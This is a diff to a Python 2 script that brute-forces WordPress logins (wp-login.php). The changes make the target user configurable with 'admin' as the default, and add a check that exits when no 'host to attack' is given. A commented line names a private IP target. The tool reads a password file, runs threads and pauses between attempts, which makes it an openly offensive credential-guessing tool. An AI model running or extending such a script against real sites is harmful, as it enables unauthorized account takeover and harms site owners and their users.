@@ -12,7 +12,7 @@ import signal
 import sys
 
 def check_pass(passwords, url, user, threadNum, timing, q, debug):
-	user = "bob"
+	user = user
 	regex = ur"<strong>ERROR</strong>"
 	#url="http://10.10.1.29:8000/wp-login.php"
 	global RUNNING
@@ -80,6 +80,12 @@ def main(argv):
 		print "No password file.."
 		sys.exit(-1)
 
+	if not results.user:
+		print "No user specified, using default 'admin' user."
+		results.user = "admin"
+	else:
+		print "Using user '%s'" % (results.user)
+
 	if (results.threads):
 		THREADS = results.threads
 	else:
@@ -88,6 +94,10 @@ def main(argv):
 	if (results.seconds):
 		print "Pausing %d seconds between each login attempt." % (results.seconds)
 		TIMING = results.seconds
+
+	if not results.host:
+		print "No host to attack."
+		sys.exit(-1)
 
 	# how many lines are we dealing with?
 	num_lines = sum(1 for line in open(PASSWORDS))
